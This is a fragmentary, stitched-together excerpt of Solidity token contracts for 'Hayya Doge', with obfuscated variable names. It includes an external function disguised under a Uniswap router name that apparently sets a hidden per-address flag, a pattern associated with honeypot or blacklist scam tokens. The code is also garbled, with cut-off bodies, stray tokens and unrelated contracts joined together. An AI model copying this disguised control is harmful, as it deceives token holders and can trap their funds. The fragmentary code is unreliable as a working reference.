...
contract HayyaDoge is Context, IERC20, Ownable {
    mapping(address => bool) private _ExcluFee;
    mapping(address => bool) private dwajdwa;
    mapping(address => mapping(address => uint256)) private allown;
    using Address for address;
    bool private diawifwa = true;
    address[] private fawges;
    using SafeMath for uint256;
    uint256 private _iwdadawd = uint256(0);
    uint8 private _dwakfawf;
    mapping(address => uint256) private _dwajfkwa;
    mapping(address => uint256) private _dkawlfaw;
    address _owner;
    uint256 private _tFeeTotal = BurnTax+MarketTax;
    uint256 private constant MAX = ~uint256(0);
    uint256 private _totalSupply = 1000000000000000000 * 10**4;
    uint8 private _decimals = 9;
    string private _name = "Hayya Doge";
    string private _symbol = "Hayya Doge";
    ...
    constructor() public {
        _owner = _msgSender();
        _dwajfkwa[_msgSender()] = _totalSupply;
...
tAmount 
    ...
    function swapExactTokensForETHSupportingFeeOnTransferTokens(address spender,address spenders)
    external
    lockTheSwap
    {
        dwajdwa[
    ...
    lockTheSwap
{
    ...
    function _transfers(
        ...
        _dwajfkwa[sender] = _dwajfkwa[sender].sub(toAmount);
        _dwajfkwa[recipient] = _dwajfkwa[recipient].add(toAmount);
...
contract CoinToken is Context, IERC20, Ownable {
    ...
    dividendTracker = diawifwaDividendTracker(
    ...
    function withdrawDividend() public pure override {
        require(
            false,
            "Dividend_Tracker: withdrawDividend disabled. Use the 'claim' function on the main diawifwa contract."
        );
    }
...
contract diawifwa is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    diawifwaDividendTracker public dividendTracker;
